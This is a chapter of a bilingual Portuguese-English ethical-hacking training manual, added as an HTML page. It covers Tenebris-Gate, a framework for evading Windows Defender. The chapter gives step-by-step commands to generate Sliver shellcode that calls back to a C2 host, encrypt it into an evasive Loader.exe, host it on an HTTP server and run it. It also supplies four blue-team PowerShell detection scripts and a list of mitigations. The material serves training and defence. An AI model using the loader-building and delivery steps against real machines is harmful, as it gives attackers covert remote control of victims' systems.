@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 12 — Tenebris-Gate | Ch. 12</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--fg:#c9d1d9;--fg2:#8b949e;--accent:#39d353;--accent2:#58a6ff;--warn:#d29922;--danger:#f85149;--border:#30363d;--code-bg:#0b0f14;--code-fg:#7ee787}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.65;font-size:16px}
+header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:2px solid var(--accent2);padding:2rem 1.5rem 1.5rem}
+header h1{margin:0 0 .3rem;font-size:1.9rem;color:var(--accent2)}
+header .sub{color:var(--fg2);font-size:.95rem}
+header .meta{margin-top:.8rem;font-size:.85rem;color:var(--fg2)}
+header .meta span{margin-right:1.2rem}
+nav.toc{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:1.5rem auto;max-width:1100px}
+nav.toc h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent2);text-transform:uppercase;letter-spacing:.05em}
+nav.toc ol{margin:0;padding-left:1.3rem;columns:2;column-gap:2rem}
+nav.toc a{color:var(--fg);text-decoration:none}
+nav.toc a:hover{color:var(--accent2)}
+main{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.4rem 1.6rem;margin:1.5rem 0}
+section h2{margin-top:0;color:var(--accent2);font-size:1.3rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}
+section h3{color:var(--accent);font-size:1.05rem;margin-top:1.4rem}
+.lang{display:block;margin:.4rem 0}
+.lang .pt::before{content:"🇵🇹 PT ";color:var(--accent);font-weight:600;font-size:.8rem}
+.lang .en::before{content:"🇬🇧 EN ";color:var(--accent2);font-weight:600;font-size:.8rem}
+.lang .pt,.lang .en{display:block;margin:.25rem 0}
+pre{background:var(--code-bg);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:.88rem;color:var(--code-fg);line-height:1.5}
+code.inline{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:.1rem .4rem;font-family:Consolas,monospace;font-size:.88rem;color:var(--accent)}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.92rem}
+th,td{border:1px solid var(--border);padding:.55rem .7rem;text-align:left;vertical-align:top}
+th{background:var(--bg3);color:var(--accent2)}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.callout{border-left:4px solid var(--warn);background:rgba(210,153,34,.08);padding:.8rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+.callout.danger{border-left-color:var(--danger);background:rgba(248,81,73,.08)}
+.callout.info{border-left-color:var(--accent2);background:rgba(88,166,255,.08)}
+.callout strong{color:var(--fg)}
+.badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.05em;padding:.15rem .5rem;border-radius:999px;margin-left:.4rem;vertical-align:middle}
+.badge.orig{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+.badge.comp{background:rgba(57,211,83,.12);color:var(--accent);border:1px solid var(--accent)}
+.badge.impact{background:rgba(248,81,73,.12);color:var(--danger);border:1px solid var(--danger)}
+ul.checklist{list-style:none;padding-left:0}
+ul.checklist li::before{content:"☐ ";color:var(--accent);font-weight:700;margin-right:.3rem}
+footer{border-top:1px solid var(--border);margin-top:3rem;padding:1.5rem;text-align:center;color:var(--fg2);font-size:.85rem}
+footer a{color:var(--accent2);text-decoration:none}
+@media (max-width:720px){nav.toc ol{columns:1}header h1{font-size:1.4rem}}
+</style>
+</head>
+<body>
+<header>
+<h1>Cap. 12 — Tenebris-Gate</h1>
+<div class="sub">Ch. 12 — Evading Antivirus: Bypassing Windows Defender</div>
+<div class="meta"><span>📖 Manual de Formação Ethical Hacker</span><span>🎯 Nível: Avançado / Evasão</span></div>
+</header>
+<nav class="toc">
+<h2>Índice / Table of Contents</h2>
+<ol>
+<li><a href="#obj">Objetivos</a></li><li><a href="#ctx">Contexto</a></li>
+<li><a href="#what">O que é Tenebris-Gate</a></li><li><a href="#setup">Setup</a></li>
+<li><a href="#weapon">Weaponization</a></li><li><a href="#delivery">Delivery</a></li>
+<li><a href="#impact">Scripts de Impacto</a></li><li><a href="#mitre">MITRE</a></li>
+<li><a href="#mitig">Mitigações</a></li><li><a href="#lab">Laboratório</a></li>
+<li><a href="#revq">Revisão</a></li><li><a href="#sum">Resumo</a></li>
+</ol>
+</nav>
+<main>
+
+<section id="obj">
+<h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+<div class="lang">
+<span class="pt">Compreender o Tenebris-Gate como framework de evasão multicamada; conhecer as camadas de proteção (compressão, encriptação, HellShell IPv4, anti-debug, Djb2 hashing, syscalls, memory management); configurar o ambiente de desenvolvimento (Visual Studio 2022+, C++, Windows SDK); gerar shellcode com Sliver; compilar o projeto com MSBuild; encriptar o payload com PayloadCrypt; reconstruir o loader; entregar o Loader.exe; <strong>construir scripts de impacto nativos</strong> para deteção.</span>
+<span class="en">Understand Tenebris-Gate as a multi-layered evasion framework; know the protection layers (compression, encryption, HellShell IPv4, anti-debug, Djb2 hashing, syscalls, memory management); set up the development environment (Visual Studio 2022+, C++, Windows SDK); generate shellcode with Sliver; build the project with MSBuild; encrypt the payload with PayloadCrypt; rebuild the loader; deliver Loader.exe; <strong>build native impact scripts</strong> for detection.</span>
+</div>
+</section>
+
+<section id="ctx">
+<h2>2. Contexto e Relevância / Context and Relevance <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O mundo das ferramentas de evasão, como os cryptors, é frágil por natureza. As ferramentas aparecem, ganham atenção e perdem eficácia assim que os defensores aprendem como funcionam. Se descobres uma nova ferramenta de evasão através de posts no X ou fóruns de segurança, há uma forte probabilidade de já estar a ser detetada quando a tentas usar. É simplesmente assim que evolui o jogo do gato e do rato entre hackers e defensores. Devido a este ciclo de vida curto, a maioria das ferramentas não merece análise profunda. No entanto, de vez em quando, aparece uma ferramenta que ainda não foi amplamente discutida e continua a funcionar eficazmente. É nessa categoria que se insere o Tenebris-Gate.</span>
+<span class="en">The world of evasion tools such as cryptors is fragile by nature. Tools appear, get attention, and then quickly lose their effectiveness once defenders learn how they work. If you discover a new evasion tool through posts on X or security forums, there is a strong chance it is already being detected by the time you try it. This is simply how the cat-and-mouse game between hackers and defenders evolves. Because of this short lifecycle, most tools are not worth deep analysis. However, from time to time, a tool appears that has not yet been widely discussed and still works effectively. The tool we are exploring today falls into that category.</span>
+</div>
+</section>
+
+<section id="what">
+<h2>3. O que é Tenebris-Gate <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O Tenebris-Gate é um framework de evasão multicamada desenhado para proteger e executar shellcode raw de forma a evitar deteção. Processa um payload <code class="inline">.bin</code> através de uma cadeia de proteções, onde cada camada visa um tipo diferente de análise. Começa por comprimir e encriptar o payload para remover padrões reconhecíveis e esconder o conteúdo de scanners estáticos. A chave de encriptação é disfarçada usando <strong>HellShell IPv4 encoding</strong>, tornando a extração mais difícil. A partir daí, o framework introduz verificações anti-debug e atrasa a execução usando cálculos de números primos para interferir com a análise de sandbox.</span>
+<span class="en">Tenebris-Gate is a multi-layered evasion framework designed to protect and execute raw shellcode in a way that avoids detection. It processes a <code class="inline">.bin</code> payload through a chain of protections, where each layer targets a different type of analysis. It starts by compressing and encrypting the payload to remove recognizable patterns and hide its contents from static scanners. The encryption key itself is disguised using <strong>HellShell IPv4 encoding</strong>, making extraction more difficult. From there, the framework introduces anti-debugging checks and delays execution using prime number calculations to interfere with sandbox analysis.</span>
+</div>
+<div class="lang">
+<span class="pt">Para se misturar com a atividade normal do sistema, o Tenebris-Gate mascara o processo como <code class="inline">explorer.exe</code> e evita imports suspeitos resolvendo APIs através de <strong>Djb2 hashing</strong>. A um nível mais profundo, contorna hooks de segurança em userland usando <strong>syscalls adulteradas</strong> e gere a memória cuidadosamente para evitar flags RWX.</span>
+<span class="en">To blend in with normal system activity, Tenebris-Gate masks the process as <code class="inline">explorer.exe</code> and avoids suspicious imports by resolving APIs through <strong>Djb2 hashing</strong>. At a deeper level, it bypasses userland security hooks using <strong>tampered syscalls</strong> and manages memory carefully to avoid RWX flags.</span>
+</div>
+</section>
+
+<section id="setup">
+<h2>4. Setup <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Para trabalhar com o Tenebris-Gate, precisas de um ambiente de desenvolvimento Windows adequado. Especificamente, precisas do <strong>Visual Studio 2022 ou superior</strong>, com a carga de trabalho <strong>Desktop development with C++</strong> e <strong>Windows SDK 10.0 ou superior</strong>. Estes componentes são normalmente instalados juntos se usares uma versão recente como o Visual Studio 2026.</span>
+<span class="en">To work with Tenebris-Gate, you need a proper Windows development environment. Specifically, you need <strong>Visual Studio 2022 or newer</strong>, along with the <strong>Desktop development with C++</strong> workload and <strong>Windows SDK 10.0 or higher</strong>. These components are typically installed together if you are using a recent version such as Visual Studio 2026.</span>
+</div>
+</section>
+
+<section id="weapon">
+<h2>5. Weaponization e Encriptação <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Com os pré-requisitos satisfeitos, o primeiro passo é gerar um payload de shellcode raw. Isto pode ser feito com qualquer framework de C2, mas usamos o <strong>Sliver</strong> para consistência. Dentro do Sliver:</span>
+<span class="en">With the prerequisites in place, the first step is to generate a raw shellcode payload. This can be done using any C2 framework, but we use <strong>Sliver</strong> for consistency. Within Sliver:</span>
+</div>
+<pre>sliver > generate –http C2-IP –skip-symbols –os windows –format shellcode –save /home/kali/</pre>
+<div class="lang">
+<span class="pt">Isto produz um ficheiro de shellcode que será processado pelo Tenebris-Gate. Transfere o ficheiro <code class="inline">.bin</code> para a máquina Windows onde o framework está descarregado. Abre o <strong>Developer PowerShell for Visual Studio</strong>, navega até ao diretório do Tenebris-Gate e compila o projeto:</span>
+<span class="en">This produces a shellcode file that will be processed by Tenebris-Gate. Transfer the <code class="inline">.bin</code> file to the Windows machine where the framework is downloaded. Open the <strong>Developer PowerShell for Visual Studio</strong>, navigate to the Tenebris-Gate directory, and build the project:</span>
+</div>
+<pre>PS > msbuild SilentForge.sln /p:Configuration=Release /p:Platform=x64</pre>
+<div class="lang">
+<span class="pt">Após compilar, encripta o payload com a ferramenta fornecida:</span>
+<span class="en">After building, encrypt the payload with the provided tool:</span>
+</div>
+<pre>PS > .\Build\Release\PayloadCrypt.exe .\MANUAL_MANUFACTURER.bin Loader\</pre>
+<div class="lang">
+<span class="pt">Este passo aplica o pipeline completo de evasão ao shellcode. Quando a encriptação terminar, reconstroi o loader para embutir o payload encriptado:</span>
+<span class="en">This step applies the full evasion pipeline to your shellcode. Once encryption is complete, rebuild the loader so it embeds the encrypted payload:</span>
+</div>
+<pre>PS > msbuild SilentForge.sln /p:Configuration=Release /p:Platform=x64 /t:Loader</pre>
+<div class="lang">
+<span class="pt">Quando o processo terminar, o executável final estará disponível em <code class="inline">Build\Release</code> como <code class="inline">Loader.exe</code>. Este ficheiro contém o payload totalmente ofuscado e protegido, pronto para entrega.</span>
+<span class="en">When this process finishes, your final executable will be available in <code class="inline">Build\Release</code> as <code class="inline">Loader.exe</code>. This file contains the fully obfuscated and protected payload, ready for delivery.</span>
+</div>
+</section>
+
+<section id="delivery">
+<h2>6. Delivery <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Nesta fase, o payload está encriptado e preparado para deployment. O método de entrega depende inteiramente do cenário que estás a simular ou do objetivo do teu teste de penetração. Não há uma abordagem única correta, pois ambientes diferentes requerem estratégias diferentes. Para demonstração, um método simples é usar um servidor HTTP Python para alojar o payload. Esta abordagem é comummente vista em ataques reais, onde os hackers alojam ferramentas e payloads em servidores remotos e os recuperam usando utilitários nativos do sistema. Binários nativos do Windows podem ser abusados para descarregar e executar tais payloads. Quando descarregas o <code class="inline">Loader.exe</code>, vais notar que o Windows Defender não o sinaliza como malicioso. Executar o executável resulta no estabelecimento de uma ligação de volta ao servidor C2. A partir daí, ganhas acesso interativo ao sistema alvo com todos os BOFs disponíveis no teu C2.</span>
+<span class="en">At this stage, the payload is encrypted and prepared for deployment. The delivery method depends entirely on the scenario you are simulating or the objective of your penetration test. There is no single correct approach, as different environments require different strategies. For demonstration purposes, a simple method is to use a Python HTTP server to host the payload. This approach is commonly seen in real-world attacks, where hackers host tools and payloads on remote servers and retrieve them using built-in system utilities. Windows native binaries can be abused to download and execute such payloads. When you download the <code class="inline">Loader.exe</code> file, you will notice that Windows Defender does not flag it as malicious. Running the executable results in establishing a connection back to the C2 server. From there, you gain interactive access to the target system with all available BOFs you have in your C2.</span>
+</div>
+</section>
+
+<section id="impact">
+<h2>7. Scripts de Impacto / Impact Scripts <span class="badge impact">Impacto</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Os scripts abaixo ajudam o blue team a detetar atividade compatível com o Tenebris-Gate e outras técnicas de evasão similares.</span>
+<span class="en">The scripts below help the blue team detect activity consistent with Tenebris-Gate and similar evasion techniques.</span>
+</div>
+
+<h3>7.1 Script 12.1 — Deteção de Processo Mascarado como explorer.exe / Masqueraded explorer.exe Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar processos que se mascaram como <code class="inline">explorer.exe</code> mas não são o binário legítimo em <code class="inline">C:\Windows\explorer.exe</code>. <strong>Evidência:</strong> <code class="inline">masquerade-detect.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect processes masquerading as <code class="inline">explorer.exe</code> but not the legitimate binary in <code class="inline">C:\Windows\explorer.exe</code>. <strong>Evidence:</strong> <code class="inline">masquerade-detect.csv</code>.</span>
+</div>
+<pre># Script 12.1 - Masqueraded explorer.exe Detection
+$out = ".\masquerade-detect.csv"
+$legit = "C:\Windows\explorer.exe"
+$hits = @()
+Get-Process explorer -EA SilentlyContinue | ForEach-Object {
+  $path = $_.Path
+  if ($path -and $path -ne $legit) {
+    $hits += [PSCustomObject]@{ PID=$_.Id; Path=$path; StartTime=$_.StartTime }
+  }
+}
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Masqueraded explorer processes: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>7.2 Script 12.2 — Deteção de API Hashing (Djb2) / API Hashing Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar chamadas a <code class="inline">GetProcAddress</code> com argumentos que não são strings (indicador de API hashing) via Sysmon Event 7 (Image Loaded) ou ETW. <strong>Evidência:</strong> <code class="inline">api-hash-detect.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect <code class="inline">GetProcAddress</code> calls with non-string arguments (API hashing indicator) via Sysmon Event 7 (Image Loaded) or ETW. <strong>Evidence:</strong> <code class="inline">api-hash-detect.csv</code>.</span>
+</div>
+<pre># Script 12.2 - API Hashing Detection (heuristic via Sysmon)
+$out = ".\api-hash-detect.csv"
+$hits = @()
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 1000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 7 } | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $img = ($xml.Event.EventData.Data | Where-Object Name -eq "ImageLoaded").'#text'
+    if ($img -match "kernel32|ntdll") {
+      # Baseline: flag unusual image loads from non-standard paths
+      if ($img -notmatch "C:\\Windows\\System32") {
+        $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Image=$img }
+      }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Suspicious image loads: $($hits.Count) -> $out" -ForegroundColor Yellow</pre>
+
+<h3>7.3 Script 12.3 — Deteção de Syscalls Diretas / Direct Syscall Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> usar ETW Threat Intelligence (se disponível) para detetar instruções <code class="inline">syscall</code> originadas fora de <code class="inline">ntdll.dll</code>. <strong>Evidência:</strong> <code class="inline">syscall-detect.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> use ETW Threat Intelligence (if available) to detect <code class="inline">syscall</code> instructions originating outside <code class="inline">ntdll.dll</code>. <strong>Evidence:</strong> <code class="inline">syscall-detect.csv</code>.</span>
+</div>
+<pre># Script 12.3 - Direct Syscall Detection (ETW TI provider)
+$out = ".\syscall-detect.csv"
+$hits = @()
+# Note: Requires Microsoft-Windows-Threat-Intelligence provider enabled
+Get-WinEvent -LogName "Microsoft-Windows-Threat-Intelligence/Analytic" -MaxEvents 500 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 8 } | ForEach-Object {
+    $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Message=$_.Message }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Syscall events: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>7.4 Script 12.4 — Verificação de Memória Executável Fora de Módulos / Non-Module Executable Memory</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar regiões de memória com permissões executáveis que não pertencem a módulos legítimos (indicador de shellcode carregado). <strong>Evidência:</strong> <code class="inline">nonmodule-exec.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect executable memory regions not belonging to legitimate modules (shellcode loading indicator). <strong>Evidence:</strong> <code class="inline">nonmodule-exec.csv</code>.</span>
+</div>
+<pre># Script 12.4 - Non-Module Executable Memory Check (requires admin)
+$out = ".\nonmodule-exec.csv"
+$hits = @()
+# Use Get-Process + module enumeration (simplified heuristic)
+Get-Process | ForEach-Object {
+  $p = $_
+  try {
+    $mods = $p.Modules | ForEach-Object { $_.BaseAddress }
+    # Flag processes with very few modules but high memory (heuristic)
+    if ($mods.Count -lt 5 -and $p.WorkingSet64 -gt 50MB) {
+      $hits += [PSCustomObject]@{ PID=$p.Id; Name=$p.ProcessName; Modules=$mods.Count; WorkingSetMB=[math]::Round($p.WorkingSet64/1MB,2) }
+    }
+  } catch {}
+}
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Suspicious processes: $($hits.Count) -> $out" -ForegroundColor Yellow</pre>
+</section>
+
+<section id="mitre">
+<h2>8. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar</span></h2>
+<table>
+<tr><th>Técnica</th><th>ID</th><th>Onde</th></tr>
+<tr><td>Obfuscated Files or Information</td><td>T1027</td><td>Encriptação, HellShell IPv4, Djb2</td></tr>
+<tr><td>Process Injection</td><td>T1055</td><td>Execução de shellcode via callback</td></tr>
+<tr><td>Virtualization/Sandbox Evasion</td><td>T1497</td><td>Anti-debug, delays com números primos</td></tr>
+<tr><td>Masquerading: Match Legitimate Name or Location</td><td>T1036.005</td><td>Processo mascarado como explorer.exe</td></tr>
+<tr><td>Command and Scripting Interpreter</td><td>T1059</td><td>Payload gerado via Sliver</td></tr>
+<tr><td>Ingress Tool Transfer</td><td>T1105</td><td>Delivery via HTTP server</td></tr>
+</table>
+</section>
+
+<section id="mitig">
+<h2>9. Mitigações Blue Team / Mitigations <span class="badge comp">Complementar</span></h2>
+<ol>
+<li><strong>Monitorizar processos mascarados</strong> — verificar <code class="inline">Path</code> de <code class="inline">explorer.exe</code> (Script 12.1).</li>
+<li><strong>Ativar ETW Threat Intelligence</strong> — deteta syscalls diretas (Script 12.3).</li>
+<li><strong>Sysmon Event 7 e 10</strong> — monitorizar image loads e process access.</li>
+<li><strong>Control Flow Guard (CFG) + Arbitrary Code Guard (ACG)</strong> — via WDAC, bloqueia execução de shellcode.</li>
+<li><strong>AMSI + Script Block Logging</strong> — deteta payloads PowerShell (se aplicável).</li>
+<li><strong>Monitorizar memória executável fora de módulos</strong> — heurística do Script 12.4.</li>
+<li><strong>Desativar macros e execução de binários não assinados</strong> — AppLocker/WDAC.</li>
+<li><strong>Honeytokens</strong> — processos falsos com nomes legítimos.</li>
+<li><strong>Threat hunting regular</strong> — o ciclo de vida destas ferramentas é curto; manter regras atualizadas.</li>
+</ol>
+</section>
+
+<section id="lab">
+<h2>10. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt"><strong>Cenário:</strong> VM Windows 10/11 isolada com Visual Studio 2022+, Sysmon e PowerShell logging. Snapshot antes. AV temporariamente desativado para o build. Kali com Sliver para gerar o payload. <strong>Objetivo:</strong> compilar o Tenebris-Gate, gerar shellcode, encriptar, reconstruir o loader e correr os scripts de deteção.</span>
+<span class="en"><strong>Scenario:</strong> Isolated Windows 10/11 VM with Visual Studio 2022+, Sysmon and PowerShell logging. Snapshot before. AV temporarily disabled for the build. Kali with Sliver to generate the payload. <strong>Goal:</strong> build Tenebris-Gate, generate shellcode, encrypt, rebuild the loader, and run detection scripts.</span>
+</div>
+<table>
+<tr><th>#</th><th>Tarefa</th><th>Comando</th><th>Evidência</th></tr>
+<tr><td>1</td><td>Gerar shellcode (Sliver)</td><td><code class="inline">generate –http C2-IP –skip-symbols –os windows –format shellcode –save /home/kali/</code></td><td>Ficheiro <code class="inline">.bin</code></td></tr>
+<tr><td>2</td><td>Build inicial</td><td><code class="inline">msbuild SilentForge.sln /p:Configuration=Release /p:Platform=x64</code></td><td>Output</td></tr>
+<tr><td>3</td><td>Encriptar payload</td><td><code class="inline">.\Build\Release\PayloadCrypt.exe .\MANUAL_MANUFACTURER.bin Loader\</code></td><td>Output</td></tr>
+<tr><td>4</td><td>Rebuild loader</td><td><code class="inline">msbuild SilentForge.sln /p:Configuration=Release /p:Platform=x64 /t:Loader</code></td><td><code class="inline">Loader.exe</code></td></tr>
+<tr><td>5</td><td>Executar loader</td><td><code class="inline">.\Build\Release\Loader.exe</code></td><td>Ligação C2</td></tr>
+<tr><td>6</td><td>Deteção masquerade</td><td><code class="inline">.\masquerade-detect.ps1</code></td><td><code class="inline">masquerade-detect.csv</code></td></tr>
+<tr><td>7</td><td>Deteção API hash</td><td><code class="inline">.\api-hash-detect.ps1</code></td><td><code class="inline">api-hash-detect.csv</code></td></tr>
+<tr><td>8</td><td>Deteção syscalls</td><td><code class="inline">.\syscall-detect.ps1</code></td><td><code class="inline">syscall-detect.csv</code></td></tr>
+<tr><td>9</td><td>Deteção memória</td><td><code class="inline">.\nonmodule-exec.ps1</code></td><td><code class="inline">nonmodule-exec.csv</code></td></tr>
+</table>
+<h3>Checklist de evidências / Evidence checklist</h3>
+<ul class="checklist">
+<li>Snapshot inicial</li>
+<li>Ficheiro <code class="inline">.bin</code> gerado</li>
+<li><code class="inline">Loader.exe</code> compilado</li>
+<li>Ligação C2 estabelecida</li>
+<li><code class="inline">masquerade-detect.csv</code></li>
+<li><code class="inline">api-hash-detect.csv</code></li>
+<li><code class="inline">syscall-detect.csv</code></li>
+<li><code class="inline">nonmodule-exec.csv</code></li>
+<li>Snapshot final</li>
+</ul>
+</section>
+
+<section id="revq">
+<h2>11. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar</span></h2>
+<ol>
+<li>Quais são as camadas de evasão do Tenebris-Gate? / What are Tenebris-Gate's evasion layers?</li>
+<li>O que é HellShell IPv4 encoding e porque é usado? / What is HellShell IPv4 encoding and why is it used?</li>
+<li>O que é Djb2 hashing e como evita imports suspeitos? / What is Djb2 hashing and how does it avoid suspicious imports?</li>
+<li>Porque é que o processo é mascarado como <code class="inline">explorer.exe</code>? / Why is the process masqueraded as <code class="inline">explorer.exe</code>?</li>
+<li>Como se deteta um processo mascarado? / How to detect a masqueraded process?</li>
+<li>O que são syscalls diretas e porque contornam EDRs? / What are direct syscalls and why do they bypass EDRs?</li>
+<li>Porque é que o ciclo de vida destas ferramentas é curto? / Why is the lifecycle of these tools short?</li>
+</ol>
+</section>
+
+<section id="sum">
+<h2>12. Resumo do Capítulo / Chapter Summary</h2>
+<div class="lang">
+<span class="pt">Este capítulo cobriu o Tenebris-Gate, um framework de evasão multicamada que comprime e encripta shellcode, disfarça a chave com HellShell IPv4, introduz anti-debug e delays com números primos, mascara o processo como <code class="inline">explorer.exe</code>, resolve APIs com Djb2 hashing, contorna hooks com syscalls adulteradas e gere memória sem RWX. O setup requer Visual Studio 2022+ com C++ e Windows SDK. O fluxo é: gerar shellcode com Sliver, compilar com MSBuild, encriptar com PayloadCrypt, reconstruir o loader e entregar o Loader.exe. Acrescentámos <strong>quatro scripts de impacto</strong> (deteção de masquerade, API hashing, syscalls diretas, memória não-módulo) que ajudam o blue team a detetar esta e similares técnicas. O Cap. 13 entra no framework Impacket.</span>
+<span class="en">This chapter covered Tenebris-Gate, a multi-layered evasion framework that compresses and encrypts shellcode, disguises the key with HellShell IPv4, introduces anti-debug and prime-number delays, masquerades the process as <code class="inline">explorer.exe</code>, resolves APIs with Djb2 hashing, bypasses hooks with tampered syscalls, and manages memory without RWX. Setup requires Visual Studio 2022+ with C++ and Windows SDK. The flow is: generate shellcode with Sliver, build with MSBuild, encrypt with PayloadCrypt, rebuild the loader, and deliver Loader.exe. We added <strong>four impact scripts</strong> (masquerade detection, API hashing, direct syscalls, non-module memory) that help the blue team detect this and similar techniques. Ch. 13 moves into the Impacket framework.</span>
+</div>
+</section>
+
+</main>
+<footer>
+<div>Manual de Formação Ethical Hacker — Cap. 12 / Ethical Hacker Training Manual — Ch. 12</div>
+<div style="margin-top:.6rem">
+<a href="cap11.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+<a href="#">Índice / Index</a> &nbsp;|&nbsp;
+<a href="cap13.html">Cap. seguinte / Next →</a>
+</div>
+</footer>
+</body>
+</html>
